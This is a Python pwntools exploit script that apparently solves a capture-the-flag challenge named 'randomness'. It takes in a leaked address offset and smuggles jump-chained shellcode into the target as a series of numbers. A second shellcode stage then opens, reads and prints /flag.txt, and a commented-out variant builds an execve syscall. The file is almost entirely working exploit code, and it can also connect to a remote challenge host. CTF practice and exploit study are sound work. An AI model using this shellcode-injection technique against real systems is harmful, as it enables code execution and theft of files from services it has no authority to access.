#!/usr/bin/python3

from pwn import *

exe = ELF('randomness_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x1650

        c
        ''')
        input()


if args.REMOTE:
    p = remote('1337.sb', 40005)
else:
    p = process(exe.path)
# GDB()

len = 256
p.recvuntil(b'Offset: ')
target = int(b'0x'+p.recvline()[:-1], 16) - 0x1bd
info("target " + hex(target))
sla(b' number: ', str(len))
pa = asm(f"""
    mov esi, {target}
    
    """)
pa += b'\xeb'
pa += asm("""
        add rsi, [rsp]
        jmp s2
        inc ebx
        s2:
            xor edi, edi
            pop rbx
            jmp s3
            inc ebx
            nop
            s3:
                xor eax, eax
                jmp s4
                inc ebx
                inc ebx
                s4:
                    nop
                    nop
                    pop rdx
                    jmp s5
                    inc ebx
                    inc ebx
                    nop
                    s5:
                        nop
                        nop
                        jmp s6
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        inc ebx
                        s6:
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            nop
                            mov edx, edx
                            syscall
                            """)

# pa = asm(f"""
#     nop
#     nop
#     nop
#     nop
#     jmp s1
#     inc ebx
#     s1:
#         add rdi, [rsp]
#         jmp s2
#         inc ebx
#         s2:
#             xor si, si
#             jmp s3
#             inc ebx
#             nop
#             s3:
#                 xor edx, edx
#                 jmp s4
#                 inc ebx
#                 inc ebx
#                 s4:
#                     nop
#                     nop
#                     nop
#                     jmp s5
#                     inc ebx
#                     inc ebx
#                     nop
#                     s5:
#                         nop
#                         nop
#                         jmp s6
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         inc ebx
#                         s6:
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             nop
#                             xor eax, eax
#                             add al, 0x3b
#                             syscall


#     """)

pa = pa.replace(b'\xFF\xC3', b'').replace(
    b'\x48\xFF\xC3', b'').replace(b"\x48\xFF\xC3\x59", b'')
for i in range(len):
    sl(str(u64(pa[i*6:i*6+6].ljust(8, b'\0'))))
pa = b'/flag.txt\0'.ljust(0x54, b'a') + \
    asm("mov r15, rsi"+shellcraft.amd64.linux.syscall('SYS_openat', 0, 'r15', 0, 0) +
        shellcraft.amd64.linux.syscall('SYS_read', 'rax', 'r15', 0x40) +
        shellcraft.amd64.linux.syscall('SYS_write', 1, 'r15', 0x40))
input()

s(pa)
p.interactive()
